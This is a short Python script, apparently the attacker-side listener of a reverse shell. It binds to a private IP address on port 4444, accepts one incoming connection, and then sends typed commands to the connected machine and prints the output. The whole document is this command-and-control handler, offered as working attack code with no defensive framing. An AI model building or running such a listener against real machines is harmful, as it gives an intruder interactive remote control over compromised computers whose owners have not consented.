import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("192.168.29.75", 4444))
listener.listen(0)

print("[+] Waiting for incomming connections...")
connection, address = listener.accept()

print("[+] Got a connection from " + str(address))

while True:
    command = input(">> ")
    connection.send(command.encode())
    result = connection.recv(2024)
    print(result)